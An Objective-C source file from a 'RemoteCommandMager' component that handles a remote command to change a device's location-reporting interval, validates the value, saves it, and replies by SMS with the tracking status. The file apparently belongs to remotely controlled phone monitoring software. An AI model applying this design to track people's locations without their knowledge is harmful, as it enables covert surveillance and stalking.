/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  UpdateLocationIntervalProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "UpdateLocationIntervalProcessor.h"
#import "PrefLocation.h"
#import "Preference.h"

@interface UpdateLocationIntervalProcessor (PrivateAPI)
- (BOOL) isValidInterval;
- (void) updateLocationInterval;
- (NSInteger) timeIntervalForLocation: (NSUInteger) aOption;
- (void) updateLocationIntervalException;
- (void) sendReplySMSWithResult:(NSString *) aResult;
@end

@implementation UpdateLocationIntervalProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the UpdateLocationIntervalProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"UpdateLocationIntervalProcessor--->initWithRemoteCommandData...")
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the UpdateLocationIntervalProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"UpdateLocationIntervalProcessor--->doProcessingCommand");
	if ([self isValidInterval])	[self updateLocationInterval];
	else [self updateLocationIntervalException];
	
}


#pragma mark UpdateLocationIntervalProcessor Private Methods

/**
 - Method name: updateLocationInterval
 - Purpose:This method is used to process updateLocationInterval
 - Argument list and description: No argument
 - Return description:No return type
*/

- (void) updateLocationInterval {
	DLog (@"UpdateLocationIntervalProcessor--->updateLocationInterval...");
	NSUInteger interval=[[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
    id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefLocation *prefLocation = (PrefLocation *)[prefManager preference:kLocation];
	[prefLocation setMLocationInterval:[RemoteCmdProcessorUtils timeIntervalForLocation:interval]];
	[prefManager savePreferenceAndNotifyChange:prefLocation];
	NSString *result=NSLocalizedString(@"kLocationEnable", @"");
	if ([prefLocation mEnableLocation]) 
		result=[result stringByAppendingString:NSLocalizedString(@"kOn", @"")];
	else 
	  result=  [result stringByAppendingString:NSLocalizedString(@"kOff", @"")];	
	
	result=[NSString stringWithFormat:@"%@\n%@%@",result,NSLocalizedString(@"kUpdateLocationInterval", @""),
			[RemoteCmdProcessorUtils locationTimeIntervalForDisplay: [prefLocation mLocationInterval]]];
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: isValidDigitAndURL
 - Purpose:This method is used to validate the Arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
 */

- (BOOL) isValidInterval {
	DLog (@"UpdateLocationIntervalProcessor--->isValidInterval...")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) {
		NSString *interval=[args objectAtIndex:2];
		if ([interval intValue]>=1 && [interval intValue] <=8) isValid=YES;
		else isValid=NO;
	}
	return isValid;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aResult (NSString)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult:(NSString *) aResult {
	DLog (@"UpdateLocationIntervalProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																			  andErrorCode:_SUCCESS_];
	NSString *updateLocationOnIntervalMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:updateLocationOnIntervalMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {	
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
	    												       andMessage:updateLocationOnIntervalMessage];
	}
}
/**
 - Method name: updateLocationInterval
 - Purpose:This method is invoked when  updateLocationInterval failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) updateLocationIntervalException {
	DLog (@"UpdateLocationIntervalProcessor--->updateLocationIntervalException")
	FxException* exception = [FxException exceptionWithName:@"updateLocationInterval" andReason:@"Update Location Interval Error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[super dealloc];
}

@end
